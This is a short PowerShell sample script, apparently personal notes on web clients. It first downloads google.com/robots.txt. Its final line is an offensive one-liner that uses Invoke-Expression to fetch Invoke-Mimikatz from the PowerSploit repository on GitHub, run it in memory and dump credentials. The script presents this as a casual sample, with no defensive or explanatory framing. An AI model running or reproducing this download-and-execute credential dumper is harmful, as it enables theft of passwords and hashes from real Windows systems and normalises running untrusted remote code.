# Sample scripts for playing w/ Web Clients

$webClient = New-Object Net.WebClient

$storageDir = $pwd
$file = "$storageDir\robots.txt"
$url = "https://google.com/robots.txt"
$webClient.DownloadFile($url,$file)

# Invoke Expression on remote powershell script
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
